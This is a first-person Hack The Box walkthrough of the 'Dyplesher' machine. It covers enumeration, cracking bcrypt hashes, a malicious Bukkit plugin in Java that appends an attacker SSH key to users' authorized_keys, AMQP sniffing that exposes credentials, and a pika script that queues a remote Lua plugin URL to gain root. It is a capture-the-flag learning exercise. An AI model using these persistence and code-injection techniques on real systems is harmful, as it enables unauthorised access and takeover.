# Hack The Box - Dyplesher

Why have I decided to try a box rated as "Insane"/"Brainfuck", mainly bc I do have 2 braincells and secondly bc the box seems to be funny and is back to free for a limited time so let's get it!  
**Don't start with this one if you're new to this world**

## Enumeration

through a classic `nmap -sC -sV 10.10.10.190` I get some informations about the opened port and get a web server, let's gather informations on it.  
Doing a more precise port analysis (*sudo nmap -p- --min-rate 10000 10.10.10.190*), I can see that we have port such as 5672,11211,25572,25672 that are open, let's keep this here for now.  
I know that the machine is a Linux btw.  

## On the website  

I notice that Dyplesher is online and the host is test.dyplesher.htb, ok right no problem, let's add it to my /etc/hosts, will be easier
Most of the links are # so I'm not getting a loot from it but some are reals (Staff and some other useless things).  
In the staff page I notice a red button which is an image and that leads tooo ntg. .. But the logo remind me of a game and when I open it it reveals "gogs.png". But after a research gogs isn't from a game but a GIT Service, but that's cool I've an open door maybe, the default port of gogs is 3000.  

Effectively if I browse to my-address:3000, I found the default GOGS page!  
I grab some info on the Explore page like the emails, and most importantly let's grab the version and see if there is any exploit (0.11.91.0811). There are some exploits apparently available but most of them are patched soo I don't really know.  
Let's gather more informations with everything I've for now.
Let's access the *test.dyplesher.htb* that i found in the main page and there is a weird page.  
Apparently you can add a pair value/key to the memcache, let's try to add stg, the response (browser or burp) is 500 ...  
But the fact that a GOGS exist is tricking me, maybe there is an underlying .git file with cool data !  
So let's nmap the port 80 to gather maybe more ! (nmap -sC -sV -p 80 test.dyplesher.htb)
And of course there is a .git folder !!  
Let's use [GitTools](https://github.com/internetwache/GitTools) to grab the content of it with the Dumper !  
After a git status to get info, we can see that the upper branch is gone so let's take it back by using *git reset --hard*
And ooo that's the file handling the index page we saw earlier and we've the credentials used to access the memcache service.  

## An Open Door

I've seen an open door in the memcache service and so will go this way to start my pwn.  
As memcache works with a key/value combination I need to find the keys and then grab the infos.  
Let's make a BruteForce to do that.  
Some data goes out from it like username and password, the encrypted data start like $2a$ after googling it is Unix-Blowfish so hashcat code is 3200 (*hashcat -m 3200 password.txt /usr/share/wordlists/rockyou.txt --force*)  
And thankfully one of them break, the password of felamos is mommy1 (that's cute)  
Let's login on Gogs with this account, we have firstly the memcache that we just used and another which is a gitlab backup, with only a readme, but there is 1 release so let's download it and have a look

## repo.zip

There are a few files in it, let's do a file on it and we see that this is a GitBundle, to explain quickly this is kind of a local remote for git, so I can extract data out of it.  
So let's clone all of them at once with this command:

```sh
find repositories -type f -exec git clone -b master {} \;
```

Let's read the README.md of each to get a general idea of what they do  
The 1st,3rd,4rt are standart files and in the link of the readme we can file the original projects, they are apparently fork so ntg really interesting.  
BUT THE 2ND ONE, as I've started programming on Minecraft I know what a server looks like ;)  
This is a Minecraft IOT Server.  

## Minecraft server

Relying to the post on the blog, everything makes sense, so let's dive in the files.  
In the plugins section we can see code for "LoginSecurity" so maybe we could find funny stuff in it.  
And there is a db file, after a file i notice this is a SQLite so let's open it with sqlite3 users.db  
with basic sql I get data from the users table. 
Let's hashcat the hashed password and boom it breaks !  `hashcat -m 3200 db.hash.data /usr/share/wordlists/rockyou.txt --force`  
As much as I remember, I had a /login on my ip while I was hosting my server sooo maybe if i try ?? :)  
And of course it works! I've to get the emails that I kept at the beginning and use this new password, As felamos is the dev I'm pretty sure this is his account.  
And then i'm connected into an Admin Dashboard.  

## Admin Dashboard

Inside of it I get a few data, not really interesting has it is random data I guess, but the plugins section is pretty interesting tho  
So maybe I can try to inject some Java Code as a plugin. I know that the plugin manager is Bukkit so I should be able to generate something pretty descent. So let's crack up and create an Intellij project and create a sample project like [SO](https://www.spigotmc.org/wiki/creating-a-plugin-with-maven-using-intellij-idea/)  
Once I've done that I create the main class who extends JavaPlugin and override onEnable to write a message on the logger so I know that I'm in, once done I can finally run my maven code to generate a jar.  
Let's add the jar and then go on the reload page and just type in his name, then you can go to the console and see that your logger message perfectly works, let's now create a code that can take control of that shit.  
What I can do now is, as I've seen that the ssh is active on it, try to write an ssh key so I can access it from the oustide, so I generate an ssh key and change my code to add it to .ssh/authorized_keys  
Then I reupload my code and reload again the plugin.  

```java
String[] users = {"felamos", "yuntao", "MinatoTW"};
for(String user : users){
    try{
        BufferedWriter writer = new BufferedWriter(new FileWriter("/home/" + user + "/.ssh/authorized_keys", true));
        writer.newLine();
        writer.write("ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDPwnox+xSSwzVxqT62S+eiCdCdyxWStX89S/mKx9o4Sq/iEn96onvW2uTg9dcef46z8VhFP2sECSXNz1g5lN3k9yDx1SUeW3s1dm7LIUoLVe8NH1YSlRs+Z5+CbMuVCJT40tGFKzQdNnlRs2JCzXApQPO1rnUWF2iUOxYrNRfABhKdSa+bRkk1UfOrOz2weTaRzMjYUK7CjEwxUvfpDaDe3647le94UFvJbK9jsNLqrmcdsx0Bu5JzZXYI9Z36CJDZ8U+m7/wXa41aqPK/pU1Lo7nk05zv9oLqRWlklAl06PMRXEwhYoDPG9SQqHGnfaAWZXp88lOC9V4ZnIpSh4m3 romain@Romain\n");
        writer.newLine();
        writer.close();

        System.out.println("SSH KEY ADDED TO USER " + user);
    }catch (IOException ignored){
    }
}
```

Now it appears that it worked with the MinatoTW account so I ssh it with my private key and I'm now in !!  
After a few basic comands I always run (id, pwd, whoami, stuff like that .. ), I saw in the id result that I'm in multiple groups and in the wireshark one, soooo if it's here, I can certainly do packet sniffing. But I need to find wish file is executable with my wireshark group accesses, so let's run: `find / -group wireshark -ls 2> /dev/null` and dumpcap goes out so I can use it, yesss  

## Sniffing

so I just ran `dumpcap -i any` and wait a lil to see some packets exchanges, once every minute there is a packets exchange, a cron maybe.
Let's grab it and analyze it.(copy it on your local via scp and then open it in wireshark)  
After sorting it by protocol I see some interesting data transiting via the amqp protocol, right click it and select "Follow as TCP" and we get readable JSON with password in it.  
After a few tests, those passwords are the one used for ssh so I can to felamos (the dev) via ssh and BOOM user.txt is here let's grab it !!

**WE GOT THE USER CODE**

At this point I'm really proud of me as it is one of the hardest box I've made yet.  
Okaayy now it's time to escalade to root

## Road to Root

I'm pretty happy but let's get the work done !! :)  
In the felamos profile I see a folder named as one of the other users (yuntao), let's read the file contained in it:

```sh
echo 'Hey yuntao, Please publish all cuberite plugins created by players on plugin_data "Exchange" and "Queue". Just send url to download plugins and our new code will review it and working plugins will be added to the server.' >  /dev/pts/{}
```

So by deduction (really hard one lol), I need to create a malicious cuberite plugins and publish it to plugin_data  
After googling plugin_data exchange queue, the first answer is RabbitMQ aaannnd I saw that in the nmap so there is a huge chance this is it, let's go this way then.  
But how do I authenticate to the rabbitMQ ??, as I was asking myself I was still on my amqp result and just saw a pretty cool line:

```sh
.......productS....AMQPLib.platformS....PHP.versionS....2.11.1.informationS....	copyrightS.....capabilitiesF.....authentication_failure_closet..publisher_confirmst..consumer_cancel_notifyt..exchange_exchange_bindingst.
basic.nackt..connection.blockedt..AMQPLAIN...,.LOGINS....yuntao.PASSWORDS...
EashAnicOc3Op.en_US.........
.........<.........
```

Isn't it sweet ? You see it ?? the creds and the password lol :))
OKKKK let's gather the informations I need to penetrate into that shit, The server use Cubernite and apparently it allows us to write lil plugins in LUA, sweet then I'll have to write a lua plugins  
RabbitMQ is made for ascii exchange and so I just have to add the url of my lua plugins to the queue and it should add it and exec it !  
I got the main point let's do this!  

Let's first make this with a sample plugin who'll just create a file with text in it:

```lua
local file=io.open("/tmp/Rom1.txt","wb+");
file:write("I'M ONCE AGAIN IN THE MATRIX JOHNNY !!");
io.close(file);
```

Now let's create a script to send this file to the amqp queue
On the official RabbitMQ hello world page they show us how to use [pika](https://github.com/pika/pika) so let's do the same!  
Here is my sweety code: 

```py
import pika

creds = pika.PlainCredentials('yuntao','EashAnicOc3Op')
params = pika.ConnectionParameters('10.10.10.190',5672,'/',creds)

connect = pika.BlockingConnection(params)

ch = connect.channel()
ch.basic_publish(exchange='plugin_data', body='http://10.10.14.124:8000/plug.lua')
connect.close()
```

Once done I can setup a python server on the specified port and send my request to the queue
Buuut it doesn't looks like it works and I think this is because, RabbitMQ is not allowed to grab out of his own space, like protected by a firewall or stg, so what i'll do is port fowarding ! (as I can send it via ssh)
And I run my script again and booom my server tells me that I got a request !!
And if I have a look I can see my file freshly created with root rights, what could I do then ??
Let's add my public ssh key to root authorized_keys!!

Once it's done, imma just ocnnect via ssh and get my root.txt
AND BOOOMMMM FINISHED IT

TBH, I'm pretty prouf of it as it is my first really hard box and I just had sooo much fun while doing it so thx a lot to felamos and yuntao for this box! !  
